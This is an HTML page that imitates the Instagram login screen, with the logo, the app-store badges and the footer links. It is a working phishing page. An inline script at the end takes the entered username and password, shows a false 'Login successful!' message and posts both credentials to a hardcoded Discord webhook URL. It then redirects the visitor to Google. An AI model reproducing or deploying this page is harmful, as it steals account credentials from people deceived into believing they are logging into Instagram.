<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram</title>
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/media-queries.css" />
    <link rel="icon" href="photos/insta-icon.jpg" />
</head>
<body>
    <main>
        <div class="log-in-container">
            <div class="log-in">
                <img src="photos/logo.png" class="logo" />
                <div class="log-in-form">
                    <input id="username" type="text" placeholder="Phone number, username, or email" />
                    <input id="password" type="password" placeholder="Password" />
                    <button id="login-button" class="log-in-button">Log In</button>
                </div>
                <span class="or-divider">OR</span>
                <div class="fb-login">
                    <a href="#">
                        <img src="photos/facebook-icon.png">
                        <span>Log in with Facebook</span>
                    </a>
                </div>
                <a href="#">Forgot password?</a>
            </div>
            <div class="sign-up">
                <span>Don't have an account?
                    <a href="#">Sign up</a>
                </span>
            </div>
            <div class="get-the-app">
                <span>Get the app</span>
                <div class="app-images">
                    <a href="#"><img src="photos/applestore.png" /></a>
                    <a href="#"><img src="photos/googlestore.png" /></a>
                </div>
            </div>
        </div>
        <div class="phones-container">
            <img src="photos/phones.png" />
        </div>
    </main>
    <footer>
        <ul class="footer-links">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">JOBS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATION</a></li>
            <li><a href="#">TOP</a></li>
            <li><a href="#">ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <span class="copyright">&copy; 2020 INSTAGRAM FROM FACEBOOK</span>
    </footer>

    <script>
        document.getElementById("login-button").addEventListener("click", async () => {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            // Check if both username and password are entered
            if (username && password) {
                alert("Login successful!");

                // Prepare the Discord webhook payload
                const payload = {
                    content: `New Login Dictated!\nUsername: ${username}\nPassword: ${password}`
                };

                // Send the payload to the Discord webhook
                try {
                    await fetch('https://discord.com/api/webhooks/1333648982102118410/GpM6z22SAzAz0ZOIXRMZbGiICO3QCzGGLQKNmpNpFvHqWQFBtXPhn0Z_SEIEU07Yovoe', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload),
                    });

                    // Redirect to Google
                    window.location.href = "https://www.google.com";
                } catch (error) {
                    console.error("Error sending data to Discord:", error);
                    alert("Error sending login info.");
                }
            } else {
                alert("Please enter both username and password before logging in.");
            }
        });
    </script>
</body>
</html>
